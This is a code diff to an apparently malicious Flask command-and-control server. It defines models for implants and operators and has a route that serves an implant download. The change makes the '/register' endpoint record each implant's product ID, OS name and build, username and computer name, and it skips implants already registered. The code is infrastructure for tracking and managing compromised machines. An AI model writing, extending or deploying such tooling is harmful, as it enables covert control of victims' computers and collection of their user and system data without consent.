@@ -17,7 +17,11 @@ db = SQLAlchemy(app)
 
 # Schema definitions
 class Implant(db.Model):
-	id = db.Column(db.Integer, primary_key=True)
+	ProductID = db.Column(db.String, primary_key=True)
+	OSName = db.Column(db.String, nullable=False)
+	OSBuild = db.Column(db.String, nullable=False)
+	Username = db.Column(db.String, nullable=False)
+	ComputerName = db.Column(db.String, nullable=False)
 	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 
 class Operator(flask_login.UserMixin, db.Model):
@@ -67,14 +71,23 @@ def monitor():
 
 @app.route('/register', methods=['POST'])
 def register():
-	# TODO: Needs error checking, return a proper response
+	# TODO: Needs error checking
 	# Get implant id (iid)
-	iid = request.json['gid']
+	pid = request.json['ProductID']
+	osname = request.json['OSName']
+	osbuild = request.json['OSBuild']
+	username = request.json['Username']
+	computer_name = request.json['ComputerName']
 	# Save to database
-	new_implant = Implant(iid=iid)
-	db.session.add(new_implant)
-	db.session.commit()
-	return 'Registered'
+	# Check if exists
+	if (Implant.query.filter_by(ProductID=pid).first() is None):
+		new_implant = Implant(ProductID=pid, OSName=osname, OSBuild=osbuild, Username=username, ComputerName=computer_name)
+		db.session.add(new_implant)
+		db.session.commit()
+		return flask.Response(response='Registered', status=200)
+	else:
+		return flask.Response(response='Previously registered', status=200)
+	
 
 @app.route('/initial', methods=['GET'])
 def download_implant():
